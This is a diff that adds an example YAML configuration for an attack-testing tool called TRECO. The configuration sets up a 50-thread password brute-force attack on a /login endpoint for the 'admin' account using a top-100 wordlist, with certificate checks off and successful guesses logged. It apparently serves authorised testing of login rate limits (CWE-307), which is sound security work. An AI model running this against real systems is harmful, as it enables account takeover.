@@ -1,0 +1,48 @@
+# ============================================================================
+# TRECO Example: File Source - Wordlist Attack
+# ============================================================================
+
+metadata:
+  name: "File Source Example - Wordlist Attack"
+  version: "1.0"
+  author: "TRECO Team"
+  vulnerability: "CWE-307"
+
+target:
+  host: "{{ env('TARGET_HOST', 'example.com') }}"
+  port: 443
+  tls:
+    enabled: true
+    verify_cert: false
+
+entrypoint:
+  state: wordlist_attack
+  input:
+    username: "admin"
+    passwords:
+      source: file
+      path: "builtin:passwords-top-100"
+
+states:
+  wordlist_attack:
+    description: "Brute force using wordlist"
+    
+    race:
+      threads: 50
+      input_mode: distribute
+      sync_mechanism: barrier
+    
+    request: |
+      POST /login HTTP/1.1
+      Host: {{ target.host }}
+      Content-Type: application/x-www-form-urlencoded
+      
+      username={{ username }}&password={{ input.password }}
+    
+    logger:
+      on_thread_leave: |
+        {% if response.status_code == 200 %}
+        ✅ [{{ input.password }}] SUCCESS!
+        {% else %}
+        ❌ [{{ input.password }}] Failed
+        {% endif %}
